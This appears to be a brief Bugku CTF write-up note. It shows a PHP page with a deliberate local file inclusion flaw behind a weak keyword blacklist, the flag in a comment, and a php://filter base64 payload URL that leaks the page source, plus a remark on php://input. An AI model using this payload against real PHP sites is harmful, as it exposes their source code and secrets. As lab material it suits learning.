
```php
<html>
    <title>Bugku-ctf</title>

<?php
    error_reporting(0);
    if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file);
//flag:flag{edulcni_elif_lacol_si_siht}
?>
</html>
```


payload
```
http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

```
php://input

读取post内容
```
